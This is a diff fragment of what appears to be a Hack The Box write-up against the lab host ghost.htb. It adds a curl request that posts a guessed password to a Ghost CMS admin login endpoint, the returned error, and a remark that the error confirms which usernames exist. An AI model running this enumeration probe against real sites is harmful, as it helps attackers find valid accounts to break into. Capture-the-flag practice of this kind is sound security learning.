@@ -245,5 +245,9 @@ curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H 'Content-Type: app
 Ill use the example POC in the article and see the error, this indicates this user exists
 
 ```python
-
+curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H 'Content-Type: application/json' --data '{"username":"kathryn.holland@ghost.htb","password":"asdfasdfasdf"}'
+{"errors":[{"message":"Your password is incorrect.","context":"Your password is incorrect.","type":"ValidationError","details":null,"property":null,"help":"Visit and save your profile after logging in to check for problems.","code":"PASSWORD_INCORRECT","id":"71ce7d20-a0a2-11f1-a02f-09a7d9773575","ghostErrorCode":null}]}
 ```
+
+But if i now test this POC with a user i know exists, i can see i get an error `Your password is incorrect` confirming the POC works
+
